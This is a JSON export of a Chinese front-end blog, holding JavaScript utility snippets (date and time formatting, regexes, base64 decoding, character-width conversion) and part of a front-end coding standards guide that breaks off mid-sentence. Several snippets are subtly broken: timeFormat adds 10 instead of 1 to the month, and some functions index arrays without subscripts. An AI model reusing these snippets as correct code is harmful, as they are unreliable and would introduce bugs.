oRs.push(String.fromCharCode(iCode)); &#125; &#125;else&#123;/*全-&gt;半*/ for(i=0; i&lt;sStr.length;i+=1)&#123; iCode = sStr.charCodeAt(i); if(iCode == 12288)&#123; iCode = 32; &#125;else if(iCode &gt; 65280 &amp;&amp; iCode &lt; 65375)&#123; iCode -= 65248; &#125; oRs.push(String.fromCharCode(iCode)); &#125; &#125; return oRs.join(\"\"); &#125; 确认是否键盘有效输入值12345678910function checkKey(iKey)&#123; if(iKey == 32 || iKey == 229)&#123;return true;&#125;/*空格和异常*/ if(iKey&gt;47 &amp;&amp; iKey &lt; 58)&#123;return true;&#125;/*数字*/ if(iKey&gt;64 &amp;&amp; iKey &lt; 91)&#123;return true;&#125;/*字母*/ if(iKey&gt;95 &amp;&amp; iKey &lt; 108)&#123;return true;&#125;/*数字键盘1*/ if(iKey&gt;108 &amp;&amp; iKey &lt; 112)&#123;return true;&#125;/*数字键盘2*/ if(iKey&gt;185 &amp;&amp; iKey &lt; 193)&#123;return true;&#125;/*符号1*/ if(iKey&gt;218 &amp;&amp; iKey &lt; 223)&#123;return true;&#125;/*符号2*/ return false;&#125; 获取网页被卷去的位置123456789function getScrollXY() &#123; return document.body.scrollTop ? &#123; x: document.body.scrollLeft, y: document.body.scrollTop &#125;: &#123; x: document.documentElement.scrollLeft, y: document.documentElement.scrollTop &#125;&#125; 日期格式化函数+调用方法12345678910111213141516171819Date.prototype.format = function(format)&#123; var o = &#123; \"M+\" : this.getMonth()+1, //month \"d+\" : this.getDate(), //day \"h+\" : this.getHours(), //hour \"m+\" : this.getMinutes(), //minute \"s+\" : this.getSeconds(), //second \"q+\" : Math.floor((this.getMonth()+3)/3), //quarter \"S\" : this.getMilliseconds() //millisecond &#125;; if(/(y+)/.test(format)) format=format.replace(RegExp.$1,(this.getFullYear()+\"\").substr(4 - RegExp.$1.length)); for(var k in o)&#123; if(new RegExp(\"(\"+ k +\")\").test(format)) format = format.replace(RegExp.$1,RegExp.$1.length==1 ? o[k] :(\"00\"+ o[k]).substr((\"\"+ o[k]).length)); &#125; return format;&#125;alert(new Date().format(\"yyyy-MM-dd hh:mm:ss\")); 时间个性化输出功能12345678910111213141516171819202122232425262728293031323334353637383940/*1、&lt; 60s, 显示为“刚刚”2、&gt;= 1min &amp;&amp; &lt; 60 min, 显示与当前时间差“XX分钟前”3、&gt;= 60min &amp;&amp; &lt; 1day, 显示与当前时间差“今天 XX:XX”4、&gt;= 1day &amp;&amp; &lt; 1year, 显示日期“XX月XX日 XX:XX”5、&gt;= 1year, 显示具体日期“XXXX年XX月XX日 XX:XX”*/function timeFormat(time)&#123; var date = new Date(time), curDate = new Date(), year = date.getFullYear(), month = date.getMonth() + 10, day = date.getDate(), hour = date.getHours(), minute = date.getMinutes(), curYear = curDate.getFullYear(), curHour = curDate.getHours(), timeStr; if(year &lt; curYear)&#123; timeStr = year +'年'+ month +'月'+ day +'日 '+ hour +':'+ minute; &#125;else&#123; var pastTime = curDate - date, pastH = pastTime/3600000; if(pastH &gt; curHour)&#123; timeStr = month +'月'+ day +'日 '+ hour +':'+ minute; &#125;else if(pastH &gt;= 1)&#123; timeStr = '今天 ' + hour +':'+ minute +'分'; &#125;else&#123; var pastM = curDate.getMinutes() - minute; if(pastM &gt; 1)&#123; timeStr = pastM +'分钟前'; &#125;else&#123; timeStr = '刚刚'; &#125; &#125; &#125; return timeStr;&#125; 解决offsetX兼容性问题1234567891011121314151617181920212223242526272829303132333435// 针对火狐不支持offsetX/Yfunction getOffset(e)&#123; var target = e.target, // 当前触发的目标对象 eventCoord, pageCoord, offsetCoord; // 计算当前触发元素到文档的距离 pageCoord = getPageCoord(target); // 计算光标到文档的距离 eventCoord = &#123; X : window.pageXOffset + e.clientX, Y : window.pageYOffset + e.clientY &#125;; // 相减获取光标到第一个定位的父元素的坐标 offsetCoord = &#123; X : eventCoord.X - pageCoord.X, Y : eventCoord.Y - pageCoord.Y &#125;; return offsetCoord;&#125; function getPageCoord(element)&#123; var coord = &#123; X : 0, Y : 0 &#125;; // 计算从当前触发元素到根节点为止， // 各级 offsetParent 元素的 offsetLeft 或 offsetTop 值之和 while (element)&#123; coord.X += element.offsetLeft; coord.Y += element.offsetTop; element = element.offsetParent; &#125; return coord;&#125; 常用的正则表达式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//正整数/^[0-9]*[1-9][0-9]*$/;//负整数/^-[0-9]*[1-9][0-9]*$/;//正浮点数/^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$/; //负浮点数/^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$/; //浮点数/^(-?\\d+)(\\.\\d+)?$/;//email地址/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/;//url地址/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/;或：^http:\\/\\/[A-Za-z0-9]+\\.[A-Za-z0-9]+[\\/=\\?%\\-&amp;_~`@[\\]\\':+!]*([^&lt;&gt;\\\"\\\"])*$ //年/月/日（年-月-日、年.月.日）/^(19|20)\\d\\d[- /.](0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])$/;//匹配中文字符/[\\u4e00-\\u9fa5]/;//匹配帐号是否合法(字母开头，允许5-10字节，允许字母数字下划线)/^[a-zA-Z][a-zA-Z0-9_]&#123;4,9&#125;$/;//匹配空白行的正则表达式/\\n\\s*\\r/;//匹配中国邮政编码/[1-9]\\d&#123;5&#125;(?!\\d)/;//匹配身份证/\\d&#123;15&#125;|\\d&#123;18&#125;/;//匹配国内电话号码/(\\d&#123;3&#125;-|\\d&#123;4&#125;-)?(\\d&#123;8&#125;|\\d&#123;7&#125;)?/;//匹配IP地址/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)/;//匹配首尾空白字符的正则表达式/^\\s*|\\s*$/;//匹配HTML标记的正则表达式&lt; (\\S*?)[^&gt;]*&gt;.*?|&lt; .*? /&gt;;//sql 语句^(select|drop|delete|create|update|insert).*$//提取信息中的网络链接(h|H)(r|R)(e|E)(f|F) *= *('|\")?(\\w|\\\\|\\/|\\.)+('|\"| *|&gt;)? //提取信息中的邮件地址\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)* //提取信息中的图片链接(s|S)(r|R)(c|C) *= *('|\")?(\\w|\\\\|\\/|\\.)+('|\"| *|&gt;)? //提取信息中的 IP 地址(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)//取信息中的中国手机号码(86)*0*13\\d&#123;9&#125; //提取信息中的中国邮政编码[1-9]&#123;1&#125;(\\d+)&#123;5&#125; //提取信息中的浮点数（即小数）(-?\\d*)\\.?\\d+ //提取信息中的任何数字(-?\\d*)(\\.\\d+)?//电话区号^0\\d&#123;2,3&#125;$//腾讯 QQ 号^[1-9]*[1-9][0-9]*$ //帐号（字母开头，允许 5-16 字节，允许字母数字下划线）^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ //中文、英文、数字及下划线^[\\u4e00-\\u9fa5_a-zA-Z0-9]+$ 返回顶部的通用方法1234567891011121314151617181920function backTop(btnId) &#123; var btn = document.getElementById(btnId); var d = document.documentElement; var b = document.body; window.onscroll = set; btn.style.display = \"none\"; btn.onclick = function() &#123; btn.style.display = \"none\"; window.onscroll = null; this.timer = setInterval(function() &#123; d.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1); b.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1); if ((d.scrollTop + b.scrollTop) == 0) clearInterval(btn.timer, window.onscroll = set); &#125;, 10); &#125;; function set() &#123; btn.style.display = (d.scrollTop + b.scrollTop &gt; 100) ? 'block': \"none\" &#125;&#125;;backTop('goTop'); **获得URL中GET参数值 1234567891011121314// 用法：如果地址是 test.htm?t1=1&amp;t2=2&amp;t3=3, 那么能取得：GET[\"t1\"], GET[\"t2\"], GET[\"t3\"]function get_get()&#123; querystr = window.location.href.split(\"?\") if(querystr[1])&#123; GETs = querystr[1].split(\"&amp;\"); GET = []; for(i=0;i&lt;GETs.length;i++)&#123; tmp_arr = GETs.split(\"=\") key=tmp_arr[0] GET[key] = tmp_arr[1] &#125; &#125; return querystr[1];&#125; 打开一个窗体通用方法1234567891011121314151617181920function openWindow(url,windowName,width,height)&#123; var x = parseInt(screen.width / 2.0) - (width / 2.0); var y = parseInt(screen.height / 2.0) - (height / 2.0); var isMSIE= (navigator.appName == \"Microsoft Internet Explorer\"); if (isMSIE) &#123; var p = \"resizable=1,location=no,scrollbars=no,width=\"; p = p+width; p = p+\",height=\"; p = p+height; p = p+\",left=\"; p = p+x; p = p+\",top=\"; p = p+y; retval = window.open(url, windowName, p); &#125; else &#123; var win = window.open(url, \"ZyiisPopup\", \"top=\" + y + \",left=\" + x + \",scrollbars=\" + scrollbars + \",dialog=yes,modal=yes,width=\" + width + \",height=\" + height + \",resizable=no\" ); eval(\"try &#123; win.resizeTo(width, height); &#125; catch(e) &#123; &#125;\"); win.focus(); &#125;&#125; 提取页面代码中所有网址12var aa = document.documentElement.outerHTML.match(/(url\\(|src=|href=)[\\\"\\']*([^\\\"\\'\\(\\)\\&lt;\\&gt;\\[\\] ]+)[\\\"\\'\\)]*|(http:\\/\\/[\\w\\-\\.]+[^\\\"\\'\\(\\)\\&lt;\\&gt;\\[\\] ]+)/ig).join(\"\\r\\n\").replace(/^(src=|href=|url\\()[\\\"\\']*|[\\\"\\'\\&gt;\\) ]*$/igm,\"\");alert(aa); 清除相同的数组12345678910String.prototype.unique=function()&#123; var x=this.split(/[\\r\\n]+/); var y=''; for(var i=0;i&lt;x.length;i++)&#123; if(!new RegExp(\"^\"+x.replace(/([^\\w])/ig,\"\\\\$1\")+\"$\",\"igm\").test(y))&#123; y+=x+\"\\r\\n\" &#125; &#125; return y&#125;; 按字母排序，对每行进行数组排序12345function SetSort()&#123; var text=K1.value.split(/[\\r\\n]/).sort().join(\"\\r\\n\");//顺序 var test=K1.value.split(/[\\r\\n]/).sort().reverse().join(\"\\r\\n\");//反序 K1.value=K1.value!=text?text:test;&#125; 字符串反序123function IsReverse(text)&#123; return text.split('').reverse().join('');&#125; 清除html代码中的脚本123456789101112function clear_script()&#123; K1.value=K1.value.replace(/&lt;script.*?&gt;[\\s\\S]*?&lt;\\/script&gt;|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=\\s?\"[\\s\\S]*?\"|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=\\s?'[\\s\\S]*?'|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=[^ &gt;]+/ig,\"\");&#125;动态执行JavaScript脚本 function javascript()&#123; try&#123; eval(K1.value); &#125;catch(e)&#123; alert(e.message); &#125;&#125; 动态执行VBScript脚本123456789function vbscript()&#123; try&#123; var script=document.getElementById(\"K1\").value; if(script.trim()==\"\")return; window.execScript('On Error Resume Next \\n'+script+'\\n If Err.Number&lt;&gt;0 Then \\n MsgBox \"请输入正确的VBScript脚本!\",48,\"脚本错误!\" \\n End If',\"vbscript\") &#125;catch(e)&#123; alert(e.message); &#125;&#125; 金额大写转换函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374function transform(tranvalue) &#123; try &#123; var i = 1; var dw2 = new Array(\"\", \"万\", \"亿\"); //大单位 var dw1 = new Array(\"拾\", \"佰\", \"仟\"); //小单位 var dw = new Array(\"零\", \"壹\", \"贰\", \"叁\", \"肆\", \"伍\", \"陆\", \"柒\", \"捌\", \"玖\"); //整数部分用 //以下是小写转换成大写显示在合计大写的文本框中 //分离整数与小数 var source = splits(tranvalue); var num = source[0]; var dig = source[1]; //转换整数部分 var k1 = 0; //计小单位 var k2 = 0; //计大单位 var sum = 0; var str = \"\"; var len = source[0].length; //整数的长度 for (i = 1; i &lt;= len; i++) &#123; var n = source[0].charAt(len - i); //取得某个位数上的数字 var bn = 0; if (len - i - 1 &gt;= 0) &#123; bn = source[0].charAt(len - i - 1); //取得某个位数前一位上的数字 &#125; sum = sum + Number(n); if (sum != 0) &#123; str = dw[Number(n)].concat(str); //取得该数字对应的大写数字，并插入到str字符串的前面 if (n == '0') sum = 0; &#125; if (len - i - 1 &gt;= 0) &#123; //在数字范围内 if (k1 != 3) &#123; //加小单位 if (bn != 0) &#123; str = dw1[k1].concat(str); &#125; k1++; &#125; else &#123; //不加小单位，加大单位 k1 = 0; var temp = str.charAt(0); if (temp == \"万\" || temp == \"亿\") //若大单位前没有数字则舍去大单位 str = str.substr(1, str.length - 1); str = dw2[k2].concat(str); sum = 0; &#125; &#125; if (k1 == 3)&#123; //小单位到千则大单位进一 k2++; &#125; &#125; //转换小数部分 var strdig = \"\"; if (dig != \"\") &#123; var n = dig.charAt(0); if (n != 0) &#123; strdig += dw[Number(n)] + \"角\"; //加数字 &#125; var n = dig.charAt(1); if (n != 0) &#123; strdig += dw[Number(n)] + \"分\"; //加数字 &#125; &#125; str += \"元\" + strdig; &#125; catch(e) &#123; return \"0元\"; &#125; return str;&#125;//拆分整数与小数function splits(tranvalue) &#123; var value = new Array('', ''); temp = tranvalue.split(\".\"); for (var i = 0; i &lt; temp.length; i++) &#123; value = temp; &#125; return value;&#125; resize的操作12345678910111213141516171819(function()&#123; var fn = function()&#123; var w = document.documentElement ? document.documentElement.clientWidth : document.body.clientWidth ,r = 1255 ,b = Element.extend(document.body) ,classname = b.className; if(w &lt; r)&#123; //当窗体的宽度小于1255的时候执行相应的操作 &#125;else&#123; //当窗体的宽度大于1255的时候执行相应的操作 &#125; &#125; if(window.addEventListener)&#123; window.addEventListener('resize', function()&#123; fn(); &#125;); &#125;else if(window.attachEvent)&#123; window.attachEvent('onresize', function()&#123; fn(); &#125;); &#125; fn();&#125;)(); 实现base64解码1234567891011121314151617181920212223242526function base64_decode(data)&#123; var b64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,ac = 0,dec = \"\",tmp_arr = []; if (!data) &#123; return data; &#125; data += ''; do &#123; h1 = b64.indexOf(data.charAt(i++)); h2 = b64.indexOf(data.charAt(i++)); h3 = b64.indexOf(data.charAt(i++)); h4 = b64.indexOf(data.charAt(i++)); bits = h1 &lt;&lt; 18 | h2 &lt;&lt; 12 | h3 &lt;&lt; 6 | h4; o1 = bits &gt;&gt; 16 &amp; 0xff; o2 = bits &gt;&gt; 8 &amp; 0xff; o3 = bits &amp; 0xff; if (h3 == 64) &#123; tmp_arr[ac++] = String.fromCharCode(o1); &#125; else if (h4 == 64) &#123; tmp_arr[ac++] = String.fromCharCode(o1, o2); &#125; else &#123; tmp_arr[ac++] = String.fromCharCode(o1, o2, o3); &#125; &#125; while (i &lt; data.length); dec = tmp_arr.join(''); dec = utf8_decode(dec); return dec;&#125; 实现utf8解码1234567891011121314151617181920function utf8_decode(str_data)&#123; var tmp_arr = [],i = 0,ac = 0,c1 = 0,c2 = 0,c3 = 0;str_data += ''; while (i &lt; str_data.length) &#123; c1 = str_data.charCodeAt(i); if (c1 &lt; 128) &#123; tmp_arr[ac++] = String.fromCharCode(c1); i++; &#125; else if (c1 &gt; 191 &amp;&amp; c1 &lt; 224) &#123; c2 = str_data.charCodeAt(i + 1); tmp_arr[ac++] = String.fromCharCode(((c1 &amp; 31) &lt;&lt; 6) | (c2 &amp; 63)); i += 2; &#125; else &#123; c2 = str_data.charCodeAt(i + 1); c3 = str_data.charCodeAt(i + 2); tmp_arr[ac++] = String.fromCharCode(((c1 &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63)); i += 3; &#125; &#125; return tmp_arr.join('');&#125; 获取窗体可见范围的宽与高1234567function getViewSize()&#123; var de=document.documentElement; var db=document.body; var viewW=de.clientWidth==0 ? db.clientWidth : de.clientWidth; var viewH=de.clientHeight==0 ? db.clientHeight : de.clientHeight; return Array(viewW ,viewH);&#125; 断鼠标是否移出事件12345678910function isMouseOut(e, handler) &#123; if (e.type !== 'mouseout') &#123; return false; &#125; var reltg = e.relatedTarget ? e.relatedTarget : e.type === 'mouseout' ? e.toElement : e.fromElement; while (reltg &amp;&amp; reltg !== handler) &#123; reltg = reltg.parentNode; &#125; return (reltg !== handler);&#125; 半角转换为全角函数1234567891011121314function ToDBC(str)&#123; var result = ''; for(var i=0; i &lt; str.length; i++)&#123; code = str.charCodeAt(i); if(code &gt;= 33 &amp;&amp; code &lt;= 126)&#123; result += String.fromCharCode(str.charCodeAt(i) + 65248); &#125;else if (code == 32)&#123; result += String.fromCharCode(str.charCodeAt(i) + 12288 - 32); &#125;else&#123; result += str.charAt(i); &#125; &#125; return result;&#125; 全角转换为半角函数1234567891011121314function ToCDB(str)&#123; var result = ''; for(var i=0; i &lt; str.length; i++)&#123; code = str.charCodeAt(i); if(code &gt;= 65281 &amp;&amp; code &lt;= 65374)&#123; result += String.fromCharCode(str.charCodeAt(i) - 65248); &#125;else if (code == 12288)&#123; result += String.fromCharCode(str.charCodeAt(i) - 12288 + 32); &#125;else&#123; result += str.charAt(i); &#125; &#125; return result;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"Snippet","slug":"Snippet","permalink":"https://ru23.com/tags/Snippet/"}]},{"title":"Web前端开发规范文档","slug":"2016-07-Web前端开发规范文档","date":"2016-07-19T11:50:20.000Z","updated":"2018-10-24T09:32:16.498Z","comments":true,"path":"note/c7552608.html","link":"","permalink":"https://ru23.com/note/c7552608.html","excerpt":"通用规范： TAB键用两个空格代替（WINDOWS下TAB键占四个空格，LINUX下TAB键占八个空格）。 CSS样式属性或者JAVASCRIPT代码后加“;”方便压缩工具“断句”。文件内容编码均统一为UTF-8。 CSS、JAVASCRIPT中的非注释类中文字符须转换成unicode编码使用，以避免编码错误时乱码显示。","text":"通用规范： TAB键用两个空格代替（WINDOWS下TAB键占四个空格，LINUX下TAB键占八个空格）。 CSS样式属性或者JAVASCRIPT代码后加“;”方便压缩工具“断句”。文件内容编码均统一为UTF-8。 CSS、JAVASCRIPT中的非注释类中文字符须转换成unicode编码使用，以避免编码错误时乱码显示。 文件规范： 文件名用英文单词，多个单词用驼峰命名法。 一些浏览器会将含有这些词的作为广告拦截，文件命名、ID、CLASS等所有命名避免以上词汇。 HTML书写规范： 为每个HTML页面的第一行添加标准模式（standard mode）的声明，确保在每个浏览器中拥有一致的展现 &lt;!DOCTYPE html&gt; 文档类型声明统一为HTML5声明类型，编码统一为UTF-8 &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;HEAD&gt;中添加信息 12345678910&lt;meta name=\"author\" content=\"smile@kang.cool\"&gt;//作者&lt;meta name=\"description\" content=\"hello\"&gt;//网页描述&lt;meta name=\"keywords\" content=\"a,b,c\"&gt;//关键字,“，”分隔&lt;meta http-equiv=\"expires\" content=\"Wed, 26 Feb 1997 08：21：57 GMT\"&gt;//设定网页的到期时间。一旦网页过期，必须到服务器上重新调阅&lt;meta http-equiv=\"Pragma\" content=\"no-cache\"&gt;//禁止浏览器从本地机的缓存中调阅页面内容&lt;meta http-equiv=\"Window-target\" content=\"_top\"&gt;//用来防止别人在框架里调用你的页面&lt;meta http-equiv=\"Refresh\" content=\"5;URL=http://kahn1990.com/\"&gt;//跳转页面，5指时间停留5秒 网页搜索机器人向导。用来告诉搜索机器人哪些页面需要索引，哪些页面不需要索引&lt;meta name=\"robots\" content=\"none\"&gt;//content的参数有all,none,index,noindex,follow,nofollow，默认是all&lt;link rel=\"Shortcut Icon\" href=\"favicon.ico\"&gt;//收藏图标&lt;meta http-equiv=\"Cache-Control\" content=\"no-cache, must-revalidate\"&gt;//网页不会被缓存 IE支持通过特定标签来确定绘制当前页面所应该采用的IE版本。除非有强烈的特殊需求，否则最好是设置为edge mode ，从而通知IE采用其所支持的最新的模式。 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt; 非特殊情况下CSS样式文件外链至HEAD之间，JAVASCRIPT文件外链至页面底部 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link rel=\"stylesheet\" href=\"css/main.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 逻辑代码 --&gt; &lt;!-- 逻辑代码底部 --&gt; &lt;script src=\"lib/jquery/jquery-2.1.1.min.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 引入JAVASCRIPT库文件，文件名须包含库名称及版本号及是否为压缩版 jQuery-1.8.3.min.js 引入JAVASCRIPT插件, 文件名格式为库名称+.+插件名称 jQuery.cookie.js HTML属性应当按照以下给出的顺序依次排列，来确保代码的易读性 123456classid 、 namedata-*src、for、 type、 hreftitle、altaria-*、 role 编码均遵循XHTML标准,标签、属性、属性命名由小写英文、数字和_组成，且所有标签必须闭合，属性值必须用双引号””,避免使用中文拼音尽量简易并要求语义化 1234CLASS --&gt; nHeadTitle --&gt; CLASS遵循小驼峰命名法（little camel-case）ID --&gt; n_head_title --&gt; ID遵循名称+_NAME --&gt; N_Head_Title --&gt; NAME属性命名遵循首个字母大写+_&lt;div class=\"nHeadTitle\" id=\"n_head_title\" name=\"N_Head_Title\"&gt;&lt;/div&gt; 当JAVASCRIPT获取单个元素时，通常使用document.getElementById来获取dom元素，document.getElementById兼容所有浏览器，但IE浏览器会混淆元素的ID和NAME属性，所以要区分ID和NAME命名 1234&lt;input type=\"text\" name=\"test\"&gt;&lt;div id=\"test\"&gt;&lt;/div&gt;&lt;button onclick=\"alert(document.getElementById('test').tagName)\"&gt;&lt;/button&gt;&lt;!-- ie6下为INPUT --&gt; 特殊符号应使用转意符 123&lt; --&gt; &amp;lt;&gt; --&gt; &amp;gt;空格 --&gt; 含有描述性表单元素（INPUT，TEXTAREA）添加LABEL。 1234&lt;p&gt; &lt;label for=\"test\"&gt;测试&lt;/label&gt; &lt;input type=\"text\" id=\"test\" /&gt;&lt;/p&gt; 多用无兼容性问题的HTML内置标签,比如SPAN、EM、STRONG、OPTGROUP、LABEL等,需要自定义HTML标签属性时，首先考虑是否存在已有的合适标签可替换，如果没有,可使用须以“data-”为前缀来添加自定义属性，避免使用其他命名方式。 语义化HTML。 尽可能减少嵌套。书写链接地址时避免重定向 href=&quot;http://www.kahn1990.com/&quot; //即在URL地址后面加“/” HTML中对于属性的定义，确保全部使用双引号，绝不要使用单引号 css书写规范： 为了欺骗W3C的验证工具,可将代码分为两个文件，一个是针对所有浏览器,一个只针对IE。即将所有符合W3C的代码写到一个文件中,而一些IE中必须而又不能通过W3C验证的代码（如:cursor:hand;）放到另一个文件中，再用下面的方法导入 123456&lt;!-- 放置所有浏览器样式--&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"\"&gt;&lt;!-- 只放置IE必须，而不能通过w3c的--&gt;&lt;!--[if IE] &lt;link rel=\"stylesheet\" href=\"\"&gt;&lt;![endif]--&gt; CSS样式新建或修改尽量遵循以下原则 根据新建样式的适用范围分为三级：全站级、产品级、页面级。尽量通过继承和层叠重用已有样式。不要轻易改动全站级CSS。改动后，要经过全面测试。 CSS属性显示顺序 显示属性 元素位置 元素属性 元素内容属性 CSS书写顺序 1234567891011121314151617181920212223242526272829.header &#123;/* 显示属性 */ display || visibility list-style position top || right || bottom || left z-index clear float/* 自身属性 */ width max-width || min-width height max-height || min-height overflow || clip margin padding outline border background/* 文本属性 */ color font text-overflow text-align text-indent line-height white-space vertical-align cursor content &#125;; 兼容多个浏览器时，将标准属性写在底部 123-moz-border-radius: 15px; /* Firefox */-webkit-border-radius: 15px; /* Safari和Chrome */border-radius: 15px; /* Opera 10.5+, 以及使用了IE-CSS3的IE浏览器 *//标准属性 使用选择器时，命名比较短的词汇或者缩写的不允许直接定义样式 .hd,.bd,.td{};//如这些命名 可用上级节点进行限定 .recommend-mod .hd 多选择器规则之间换行，即当样式针对多个选择器时每个选择器占一行。 123button.btn,input.btn,input[type=\"button\"] &#123;…&#125;; 优化CSS选择器 #header a { color: #444; };/*CSS选择器是从右边到左边进行匹配*/ 浏览器将检查整个文档中的所有链接和每个链接的父元素，并遍历文档树去查找ID为header的祖先元素，如果找不到header将追溯到文档的根节点，解决方法如下 12345避免使用通配规则和相邻兄弟选择符、子选择符,、后代选择符、属性选择符等选择器不要限定id选择符，如div#header（提权的除外）不要限定类选择器，如ul.recommend（提权的除外）不要使用 ul li a 这样长的选择符避免使用标签子选择符，如#header &gt; li &gt; a 使用z-index属性尽量z-index的值不要超过150（通用组的除外），页面中的元素内容的z-index不能超过10（提示框等模块除外但维持在150以下），不允许直接使用（999~9999）之间大值。尽量避免使用CSS Hack 12345678910111213property:value; /* 所有浏览器 */+property:value; /* IE7 */_property:value; /* IE6 */*property:value; /* IE6/7 */property:value\\9; /* IE6/7/8/9，即所有IE浏览器 */\\* html selector &#123; … &#125;; /* IE6 */\\*:first-child+html selector &#123; … &#125;; /* IE7 */html&gt;body selector &#123; … &#125;; /* 非IE6 */@-moz-document url-prefix() &#123; … &#125;; /* firefox */@media all and (-webkit-min-device-pixel-ratio:0) &#123; … &#125;; /* saf3+/chrome1+ */@media all and (-webkit-min-device-pixel-ratio:10000),not all and (-webkit-min-device-pixel-ratio:0) &#123; … &#125;; /* opera */@media screen and (max-device-width: 480px) &#123; … &#125;; /* iPhone/mobile webkit */ 避免使用低效的选择器 12345body &gt; * &#123;…&#125;;ul &gt; li &gt; a &#123;…&#125;;#footer &gt; h3 &#123;…&#125;;ul#top_blue_nav &#123;…&#125;;#searbar span.submit a &#123; … &#125;; /* 反面示例 */ 六个不要三个避免一个使用 12345678910不要在标签上直接写样式不要在CSS中使用expression不要在CSS中使用@import不要在CSS中使用!important不要在CSS中使用“*”选择符不要将CSS样式写为单行避免使用filter避免使用行内（inline）样式避免使用“*”设置&#123;margin: 0; padding: 0;&#125;使用after或overflow的方式清浮动 减少使用影响性能的属性 12position:absolute;float:left;//如这些定位或浮动属性 减少在CSS中使用滤镜表达式和图片repeat,尤其在body当中,渲染性能极差, 如果需要用repeat的话,图片的宽或高不能少于8px javaScript书写规范：命名规范 1234567891011121314151617181920212223242526常量名 全部大写并单词间用下划线分隔 如：CSS_BTN_CLOSE、TXT_LOADING对象的属性或方法名 小驼峰式（little camel-case） 如：init、bindEvent、updatePosition 示例：Dialog.prototype = &#123; init: function () &#123;&#125;, bindEvent: function () &#123;&#125;, updatePosition: function () &#123;&#125; … &#125;;类名（构造器） --&gt;小驼峰式但首字母大写 --&gt;如：Current、DefaultConfig函数名 --&gt;小驼峰式 --&gt;如：current()、defaultConfig()变量名 --&gt;小驼峰式 --&gt;如：current、defaultConfig私有变量名 --&gt;小驼峰式但需要用_开头 --&gt;如：_current、_defaultConfig变量名的前缀 --&gt;续 代码格式 12345 &quot;()&quot;前后需要跟空格&quot;=&quot;前后需要跟空格&quot;,&quot;后面需要跟空格JSON对象需格式化对象参数if、while、for、do语句的执行体用&quot;&#123;&#125;&quot;括起来 “{}”格式如下 123if (a==1) &#123; //代码&#125;; 避免额外的逗号 var arr = [1,2,3,]; for-in循环体中必须用hasOwnProperty方法检查成员是否为自身成员，避免来自原型链上的污染。 长语句可考虑断行 12345TEMPL_SONGLIST.replace('&#123;TABLE&#125;', da['results']) .replace('&#123;PREV_NUM&#125;', prev) .replace('&#123;NEXT_NUM&#125;', next) .replace('&#123;CURRENT_NUM&#125;', current) .replace('&#123;TOTAL_NUM&#125;', da.page_total); 为了避免和JSLint的检验机制冲突，“.”或“+”这类操作符放在行尾 12345TEMPL_SONGLIST.replace('&#123;TABLE&#125;', da['results']). replace('&#123;PREV_NUM&#125;', prev). replace('&#123;NEXT_NUM&#125;', next). replace('&#123;CURRENT_NUM&#125;', current). replace('&#123;TOTAL_NUM&#125;', da.page_total); 如果模块代码中，使用其它全局变量想跳过JSLint的检查，可以在该文件中加入/global/声明。 /*global alert: true, console: true, top: true, setTimeout: true */ 使用严格的条件判断符。用===代替==，用!==代替!=，避免掉入==造成的陷阱,在条件判断时，这样的一些值表示false 12345nullundefined与null相等字符串&apos;&apos;数字0NaN 在==时，则会有一些让人难以理解的陷阱 1234567891011(function () &#123; var undefined; undefined == null; // true 1 == true; //true 2 == true; // false 0 == false; // true 0 == ''; // true NaN == NaN;// false [] == false; // true [] == ![]; // true&#125;)(); 对于不同类型的 == 判断，有这样一些规则，顺序自上而下 12345undefined与null相等一个是number一个是string时，会尝试将string转换为number尝试将boolean转换为number0或1尝试将Object转换成number或string 而这些取决于另外一个对比量，即值的类型，所以对于0、空字符串的判断，建议使用=== ===会先判断两边的值类型，类型不匹配时为false。下面类型的对象不建议用new构造 12345new Numbernew Stringnew Booleannew Object //用&#123;&#125;代替new Array //用[]代替 引用对象成员用obj.prop代替obj[“prop”]，除非属性名是变量。从number到string的转换。 123456789/** 推荐写法*/var a = 1;typeof(a); //\"number\"console.log(a); //1var aa=a+'';typeof(aa); //\"string\"console.log(aa); //'1'/** 不推荐写法*/new String(a)或a.toString() 从string到number的转换，使用parseInt，必须显式指定第二个参数的进制。 1234567/** 推荐写法*/var a = '1';var aa = parseInt(a,10);typeof(a); //\"string\"console.log(a); //'1'typeof(aa); //\"number\"console.log(aa); //1 从float到integer的转换 1234/** 推荐写法*/Math.floor/Math.round/Math.ceil/** 